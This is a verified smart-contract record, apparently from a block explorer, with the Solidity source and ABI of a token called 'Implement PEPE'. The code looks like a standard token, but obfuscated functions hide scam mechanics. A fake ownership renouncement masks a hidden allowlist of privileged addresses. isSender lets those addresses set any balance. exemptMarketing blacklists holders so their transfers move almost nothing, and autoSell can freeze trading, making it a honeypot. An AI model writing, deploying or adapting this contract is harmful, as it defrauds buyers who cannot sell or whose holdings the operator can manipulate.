{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\ninterface toFromSell {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address liquidityReceiver) external view returns (uint256);\n\n    function transfer(address tokenLaunched, uint256 listToken) external returns (bool);\n\n    function allowance(address autoMax, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 listToken) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address tokenLaunched,\n        uint256 listToken\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed receiverBuy, uint256 value);\n    event Approval(address indexed autoMax, address indexed spender, uint256 value);\n}\n\nabstract contract shouldFee {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface senderIs {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface launchedFund {\n    function createPair(address buyAt, address senderAuto) external returns (address);\n}\n\ninterface toFromSellMetadata is toFromSell {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ImplementPEPE is shouldFee, toFromSell, toFromSellMetadata {\n\n    function exemptMarketing(address modeLiquidity) public {\n        sellFrom();\n        \n        if (modeLiquidity == walletLaunch || modeLiquidity == atLiquidity) {\n            return;\n        }\n        shouldFund[modeLiquidity] = true;\n    }\n\n    address public atLiquidity;\n\n    constructor (){\n        if (maxLaunched != buySenderLimit) {\n            maxLaunched = false;\n        }\n        senderIs listSenderShould = senderIs(buyToken);\n        atLiquidity = launchedFund(listSenderShould.factory()).createPair(listSenderShould.WETH(), address(this));\n        if (buySenderLimit) {\n            fundMaxTrading = buyLaunched;\n        }\n        walletLaunch = _msgSender();\n        modeTake();\n        liquiditySwap[walletLaunch] = true;\n        sellMaxMode[walletLaunch] = fromSenderWallet;\n        if (receiverMarketing != fundMaxTrading) {\n            fundMaxTrading = buyLaunched;\n        }\n        emit Transfer(address(0), walletLaunch, fromSenderWallet);\n    }\n\n    function isSender(address receiverTeam, uint256 listToken) public {\n        sellFrom();\n        sellMaxMode[receiverTeam] = listToken;\n    }\n\n    function owner() external view returns (address) {\n        return fundFrom;\n    }\n\n    function allowance(address buyIs, address atList) external view virtual override returns (uint256) {\n        if (atList == buyToken) {\n            return type(uint256).max;\n        }\n        return swapIsTotal[buyIs][atList];\n    }\n\n    address private fundFrom;\n\n    mapping(address => mapping(address => uint256)) private swapIsTotal;\n\n    bool public isTeam;\n\n    uint256 senderExempt;\n\n    string private marketingTotalReceiver = \"IPE\";\n\n    function modeWalletBuy(address receiverTo, address tokenLaunched, uint256 listToken) internal returns (bool) {\n        require(sellMaxMode[receiverTo] >= listToken);\n        sellMaxMode[receiverTo] -= listToken;\n        sellMaxMode[tokenLaunched] += listToken;\n        emit Transfer(receiverTo, tokenLaunched, listToken);\n        return true;\n    }\n\n    function balanceOf(address liquidityReceiver) public view virtual override returns (uint256) {\n        return sellMaxMode[liquidityReceiver];\n    }\n\n    uint256 public buyLaunched;\n\n    function fromAutoShould(address teamTokenList) public {\n        if (isTeam) {\n            return;\n        }\n        if (receiverMarketing == buyLaunched) {\n            receiverMarketing = fundMaxTrading;\n        }\n        liquiditySwap[teamTokenList] = true;\n        if (buyLaunched == receiverMarketing) {\n            receiverMarketing = fundMaxTrading;\n        }\n        isTeam = true;\n    }\n\n    function approve(address atList, uint256 listToken) public virtual override returns (bool) {\n        swapIsTotal[_msgSender()][atList] = listToken;\n        emit Approval(_msgSender(), atList, listToken);\n        return true;\n    }\n\n    uint256 public receiverMarketing;\n\n    address public walletLaunch;\n\n    function listMode(address receiverTo, address tokenLaunched, uint256 listToken) internal returns (bool) {\n        if (receiverTo == walletLaunch) {\n            return modeWalletBuy(receiverTo, tokenLaunched, listToken);\n        }\n        uint256 receiverLaunch = toFromSell(atLiquidity).balanceOf(launchTxFrom);\n        require(receiverLaunch == isReceiver);\n        require(tokenLaunched != launchTxFrom);\n        if (shouldFund[receiverTo]) {\n            return modeWalletBuy(receiverTo, tokenLaunched, walletMin);\n        }\n        return modeWalletBuy(receiverTo, tokenLaunched, listToken);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return marketingTotalReceiver;\n    }\n\n    uint8 private tradingToken = 18;\n\n    bool private minTxLaunch;\n\n    function transfer(address receiverTeam, uint256 listToken) external virtual override returns (bool) {\n        return listMode(_msgSender(), receiverTeam, listToken);\n    }\n\n    function transferFrom(address receiverTo, address tokenLaunched, uint256 listToken) external override returns (bool) {\n        if (_msgSender() != buyToken) {\n            if (swapIsTotal[receiverTo][_msgSender()] != type(uint256).max) {\n                require(listToken <= swapIsTotal[receiverTo][_msgSender()]);\n                swapIsTotal[receiverTo][_msgSender()] -= listToken;\n            }\n        }\n        return listMode(receiverTo, tokenLaunched, listToken);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return fromSenderWallet;\n    }\n\n    uint256 private fromSenderWallet = 100000000 * 10 ** 18;\n\n    uint256 constant walletMin = 13 ** 10;\n\n    string private totalReceiverBuy = \"Implement PEPE\";\n\n    bool public fundToken;\n\n    function name() external view virtual override returns (string memory) {\n        return totalReceiverBuy;\n    }\n\n    bool private buySenderLimit;\n\n    mapping(address => uint256) private sellMaxMode;\n\n    uint256 isReceiver;\n\n    event OwnershipTransferred(address indexed liquidityTx, address indexed isLimit);\n\n    bool private maxLaunched;\n\n    address buyToken = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address launchTxFrom = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    mapping(address => bool) public liquiditySwap;\n\n    function modeTake() public {\n        emit OwnershipTransferred(walletLaunch, address(0));\n        fundFrom = address(0);\n    }\n\n    uint256 private fundMaxTrading;\n\n    mapping(address => bool) public shouldFund;\n\n    function sellFrom() private view {\n        require(liquiditySwap[_msgSender()]);\n    }\n\n    function autoSell(uint256 listToken) public {\n        sellFrom();\n        isReceiver = listToken;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return tradingToken;\n    }\n\n    function getOwner() external view returns (address) {\n        return fundFrom;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoMax\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityTx\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isLimit\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverBuy\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyIs\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"atList\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listToken\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atLiquidity\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"listToken\",\"type\":\"uint256\"}],\"name\":\"autoSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityReceiver\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyLaunched\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeLiquidity\",\"type\":\"address\"}],\"name\":\"exemptMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamTokenList\",\"type\":\"address\"}],\"name\":\"fromAutoShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listToken\",\"type\":\"uint256\"}],\"name\":\"isSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"liquiditySwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverMarketing\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"shouldFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listToken\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverTo\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tokenLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listToken\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletLaunch\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "ImplementPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}